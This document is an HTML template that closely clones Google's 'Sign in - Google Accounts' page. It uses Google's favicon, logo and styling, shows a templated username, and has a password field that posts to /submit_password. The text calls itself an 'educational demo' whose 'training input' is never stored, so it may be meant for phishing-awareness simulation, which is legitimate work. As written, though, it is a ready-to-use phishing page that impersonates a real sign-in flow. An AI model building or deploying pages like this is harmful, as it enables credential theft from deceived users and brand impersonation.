<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <link rel="icon" href="https://www.google.com/favicon.ico">
    <style>
        body { 
            font-family: 'Google Sans', Roboto, Arial, sans-serif; 
            background-color: #ffffff; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            margin: 0; 
            color: #202124; 
        }
        .card-container { 
            border: none; 
            background-color: #ffffff; 
            border-radius: 8px; 
            padding: 48px 40px 36px; 
            width: 100%; 
            max-width: 448px; 
            box-sizing: border-box; 
            display: flex;
            flex-direction: column;
            justify-content: center;
        }
        .content { 
            text-align: left; 
        } 
        .logo { 
            width: 40px; 
            height: 40px; 
            margin-bottom: 40px; 
        } 
        h1 { 
            font-size: 32px; 
            font-weight: 400; 
            margin: 0 0 8px 0; 
            color: #202124; 
        } 
        p.subtitle { 
            text-align: left; 
            margin: 0 0 24px 0; 
            font-size: 16px; 
            letter-spacing: 0.1px; 
            line-height: 1.5; 
            color: #5f6368; 
        }
        .user-identifier { 
            display: inline-flex; 
            align-items: center; 
            gap: 8px; 
            border: 1px solid #dadce0; 
            border-radius: 16px; 
            padding: 6px 12px; 
            margin: 16px 0; 
            font-size: 14px; 
            font-weight: 500; 
            color: #202124;
        }
        .input-group { position: relative; margin-top: 24px; text-align: left; }
        .input-field { 
            width: 100%; 
            padding: 14px 15px; 
            border: 1px solid #dadce0; 
            border-radius: 4px; 
            box-sizing: border-box; 
            font-size: 16px; 
            background-color: #ffffff; 
            color: #202124; 
        }
        .input-field:focus { 
            outline: none; 
            border: 2px solid #1a73e8; 
            padding: 13px 14px; 
            background-color: #ffffff; 
        }
        .input-label { 
            position: absolute; 
            left: 16px; 
            top: 16px; 
            color: #5f6368; 
            pointer-events: none; 
            transition: all 0.2s ease-out; 
        }
        .input-field:focus + .input-label, .input-field:not(:placeholder-shown) + .input-label { 
            top: -8px; 
            left: 12px; 
            font-size: 12px; 
            color: #1a73e8; 
            background-color: #ffffff; 
            padding: 0 4px; 
        }
        .show-password { 
            display: flex; 
            align-items: center; 
            text-align: left; 
            margin-top: 16px; 
            font-size: 14px; 
            color: #3c4043; 
            cursor: pointer; 
        }
        .show-password input { 
            width: auto; 
            margin-right: 8px; 
        }
        .actions { 
            display: flex; 
            justify-content: space-between; 
            align-items: center; 
            margin-top: 32px; 
        }
        .link { 
            color: #1a73e8; 
            font-weight: 500; 
            text-decoration: none; 
            font-size: 14px; 
        }
        .next-button { 
            background-color: #1a73e8; 
            color: #ffffff; 
            border: none; 
            border-radius: 20px; 
            padding: 10px 24px; 
            cursor: pointer; 
            font-size: 16px; 
            font-weight: 500;
            min-width: 90px;
        }
        .error-message { 
            color: #d93025; 
            font-size: 12px; 
            text-align: left; 
            margin-top: 4px; 
            display: flex; 
            align-items: center; 
        }
        .error-icon { 
            width: 16px; 
            height: 16px; 
            margin-right: 8px; 
        }
        .footer {
            margin-top: 24px; 
            display: flex;
            justify-content: space-between;
            align-items: center;
            font-size: 12px;
            color: #5f6368;
        }
        .footer a {
            color: #5f6368;
            text-decoration: none;
            margin-left: 16px;
        }
        .footer a:hover {
            text-decoration: underline;
        }
        .footer-lang {
            display: flex;
            align-items: center;
            cursor: pointer;
        }
        .footer-lang svg { fill: #5f6368; margin-left: 4px; }
        @media (max-width: 480px) {
            body { align-items: flex-start; background-color: #ffffff; } 
            .card-container {
                border: none; 
                box-shadow: none; 
                padding: 24px; 
                margin-top: 0;
            }
            .footer {
                padding: 0 24px 10px 24px;
            }
        }
    </style>
</head>
<body>
    <div class="card-container">
        <div class="content">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c1/Google_%22G%22_logo.svg/40px-Google_%22G%22_logo.svg.png" alt="Google" class="logo">
            <h1>Welcome</h1>
            <div class="user-identifier">
                <svg aria-hidden="true" width="20" height="20" viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z" fill="#5f6368"></path></svg>
                <span>{{ username }}</span>
            </div>
            <p class="subtitle">To continue, complete the training step</p>
            <p style="margin: 0 0 8px 0; font-size: 12px; color: #5f6368;">Educational demo mode: your typed value is ignored and never stored.</p>
            <form action="/submit_password" method="POST">
                <div class="input-group">
                    <input type="password" name="password" id="password" class="input-field" placeholder=" " required>
                    <label for="password" class="input-label">Enter your training input</label>
                </div>
                <div class="show-password">
                    <input type="checkbox" id="show-password-checkbox">
                    <label for="show-password-checkbox">Show training input</label>
                </div>
                <div class="actions">
                    <a href="#" class="link">Training help</a>
                    <button type="submit" class="next-button">Next</button>
                </div>
            </form>
        </div>
        <div class="footer">
            <div class="footer-lang">
                English (United States)
                <svg aria-hidden="true" width="16" height="16" viewBox="0 0 24 24" fill="currentColor"><path d="M7 10l5 5 5-5z"></path></svg>
            </div>
            <div>
                <a href="#">Help</a>
                <a href="#">Privacy</a>
                <a href="#">Terms</a>
            </div>
        </div>
    </div>

    <script>
        const showPasswordCheckbox = document.getElementById('show-password-checkbox');
        const passwordInput = document.getElementById('password');
        if (showPasswordCheckbox && passwordInput) {
            showPasswordCheckbox.addEventListener('change', function() {
                passwordInput.type = this.checked ? 'text' : 'password';
            });
        }
    </script>
</body>
</html>
